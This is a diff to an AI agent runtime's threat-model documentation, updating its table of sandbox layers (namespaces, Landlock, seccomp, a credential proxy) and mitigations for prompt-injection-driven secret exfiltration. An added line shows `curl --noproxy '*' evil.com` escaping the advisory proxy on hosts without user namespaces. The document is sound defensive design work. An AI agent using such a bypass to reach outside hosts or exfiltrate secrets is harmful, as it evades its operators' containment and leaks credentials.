@@ -94,8 +94,8 @@ Ordered from most to least critical:
 | # | Layer | Scope | Kernel-enforced? | Bypassable by agent? |
 |---|-------|-------|------------------|---------------------|
 | 1 | `setrlimit` | Tool children (per containment) | Yes | No |
-| 2 | Containment backend (namespace sandbox) | All `--run-tool` children | Yes | No (separate process) |
-| 3 | Credential proxy (`proxy.c` `host_decide()`) | Shell and js children network | Yes (netns has no other route) | No (separate netns) |
+| 2 | Containment backend (namespace sandbox; without user namespaces Landlock and seccomp) | All `--run-tool` children | Yes | No (separate process) |
+| 3 | Credential proxy (`proxy.c` `host_decide()`) | Shell and js children network | Yes (netns has no other route); for js in code without one; advisory for the shell without one | No (separate netns); a shell program under `advisory` can ignore it |
 | 4 | Clean environment | Tool children | No (app-level) | Only via code bug |
 | 5 | `prctl(PR_SET_PDEATHSIG)` | Orphan cleanup | Yes | No |
 
@@ -104,7 +104,12 @@ Layer 4 is a soft boundary (correct code required).
 Layer 5 is bonus hardening (Linux-specific).
 
 Under containment `none`, layers 1–3 are absent and layer 4 is a blacklist
-scrub ([containment.md](containment.md)). These layers are the
+scrub ([containment.md](containment.md)). On a host without user namespaces,
+layer 2 is Landlock (files) and seccomp (no sockets under network `none`;
+no ptrace or io_uring under Landlock), which keep contents and connections
+but not existence, a private `/tmp`/`/proc`, or pathname sockets under
+`advisory` — [containment.md](containment.md) lists what they do not
+promise. These layers are the
 containment layer (layer 3) of [portability.md](portability.md#the-layers).
 
 Egress for all three network tools is decided by `host_decide()` on every
@@ -382,6 +387,7 @@ Mitigations:
 - The proxy checks `evil.com` against the call's host rules → denied (403).
 - System directories are mounted read-only. A written file lands only in the workspace, `/tmp` scratch, or a `write_path` grant; `/dev/shm`, `/dev/mqueue` and `/dev/pts` are private per call, never the host's.
 - `no_new_privs` is set on every sandboxed tool child: a setuid binary does not elevate.
+- Without user namespaces (`basic` on a Landlock host) the shell's network is advisory: `curl --noproxy '*' evil.com` gets out. Only the file side is kernel-kept there; an agent that must not reach arbitrary hosts on such a host needs `shell_exec` withheld, or network `none`.
 
 ### Prompt injection → secret exfiltration
 
@@ -391,7 +397,7 @@ Mitigations:
 - Tool children start from a clean environment. A shell child gets only the `CCLAW_SECRET_*` values its command references.
 - Provider API keys never reach a tool child.
 - `file_read` sees only the workspace and granted paths (mount namespace).
-- The file child has no `/proc`. The shell's `/proc` is a fresh mount for its own PID namespace, so `/proc/self/environ` shows only the child's own clean environment.
+- The file child has no `/proc`. The shell's `/proc` is a fresh mount for its own PID namespace, so `/proc/self/environ` shows only the child's own clean environment. Under Landlock (no PID namespace) `/proc` is the host's, read-only, and other processes' `environ` is refused by Landlock's ptrace scoping.
 
 ### Agent code bug → touches another agent's rows
 
